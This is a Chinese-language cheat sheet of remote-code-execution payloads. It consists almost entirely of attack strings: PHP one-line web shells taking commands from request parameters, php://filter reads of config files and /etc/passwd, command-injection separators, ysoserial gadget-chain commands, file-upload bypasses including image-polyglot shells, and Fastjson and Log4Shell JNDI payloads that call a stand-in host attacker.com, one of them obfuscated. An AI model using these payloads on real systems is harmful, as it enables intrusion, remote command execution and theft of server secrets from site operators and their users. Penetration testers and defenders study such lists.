# RCE远程代码执行

## 1. PHP代码执行

```php
<?php system($_GET['cmd']); ?>
<?php exec($_GET['cmd']); ?>
<?php shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php popen($_GET['cmd'],'r'); ?>
<?php assert($_POST['cmd']); ?>
<?php preg_replace('/.*/e',$_POST['cmd'],''); ?>
<?php call_user_func($_POST['cmd']); ?>
```

## 2. PHP Filter链

```
php://filter/convert.base64-encode/resource=config.php
php://filter/read=convert.base64-encode/resource=config.php
php://filter/|string.tags|system/etc/passwd
```

## 3. 命令注入

```
; whoami
| whoami
& whoami
&& whoami
|| whoami
$(whoami)
`whoami`
```

## 4. 盲命令注入

### Linux

```
sleep 5
ping -c 5 127.0.0.1
```

### Windows

```
timeout /t 5
ping -n 5 127.0.0.1
```

## 5. 反序列化漏洞

### PHP反序列化

```php
O:4:"User":2:{s:4:"name";s:5:"admin";s:3:"cmd";s:2:"id";}
```

### Java反序列化

使用ysoserial工具生成payload:

```bash
java -jar ysoserial.jar CommonsCollections1 "command"
java -jar ysoserial.jar GadgetChain1 "command"
```

## 6. 文件上传漏洞

### 基础文件上传

- 上传.php文件
- 上传.jpg文件绕过但包含PHP代码

### 文件类型绕过

- 修改Content-Type
- 修改文件扩展名
- 00截断
- .htaccess利用
- .user.ini利用

### 双扩展名绕过

```
shell.php.jpg
shell.php5
shell.phtml
```

### 图片马

```bash
copy 1.jpg /b + shell.php /b shell.jpg
```

## 7. 反序列化漏洞利用链

### Fastjson

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}
```

### Jackson

```json
{"@class":"java.lang.ProcessBuilder","@constructor_args":[{"@type":"java.util.ArrayList","@items":["calc.exe"]}],"start":""}
```

## 8. 框架RCE

### Log4j (CVE-2021-44228)

```
${jndi:ldap://attacker.com/a}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
```

### Spring SpEL

```
${T(java.lang.Runtime).getRuntime().exec('id')}
```
